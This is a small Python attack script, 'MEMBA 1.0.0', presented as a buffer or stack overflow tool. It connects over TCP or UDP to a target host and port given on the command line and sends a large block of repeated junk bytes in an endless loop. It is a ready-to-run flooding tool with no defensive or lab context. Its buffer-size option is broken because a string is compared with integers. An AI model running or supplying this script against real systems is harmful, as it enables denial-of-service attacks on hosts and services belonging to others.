#!/usr/bin/env python3
# MEMBA 1.0.0
# Buffer Overflow or Stack Overflow

import socket
import argparse

def buff(char):
	
	dt = ([ "\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2"*500, "\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb2"*500, "\xb2\xb2\xb2\xb2\xb2\xb2"*500])
	
	if char == 1:
		return dt[0]
	elif char == 2:
		return dt[1]
	elif char == 3:
		return dt[2]
	else:
		return dt[1]
	
def snddata(host, port, pkg, dt):
	if pkg == "tcp":
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			s.connect((str(host), int(port)))
			while True:
				s.send(dt.encode("utf-8"))
		except:
			print("Host is offline")
			
	elif pkg == "udp":
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		try:
			s.connect((str(host), int(port)))
			while True:
				s.send(dt.encode("utf-8"))
		except:
			print("Host is offline")
			
	else:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			s.connect((str(host), int(port)))
			while True:
				s.send(dt.encode("utf-8"))
		except:
			print("Host is offline")


ap = argparse.ArgumentParser()

ap.add_argument("-c", "--connection", required=False, help="Connection type")
ap.add_argument("-hst", "--host", required=True, help="Host IP Adress")
ap.add_argument("-p", "--port", required=True, help="Host port number")

ap.add_argument("-ch", "--char", required=True, help="Character length")

args = vars(ap.parse_args())

conn = args["connection"]
host = args["host"]
port = args["port"]

ch = args["char"]
	
chars = buff(ch)
snddata(host, port, conn, chars)
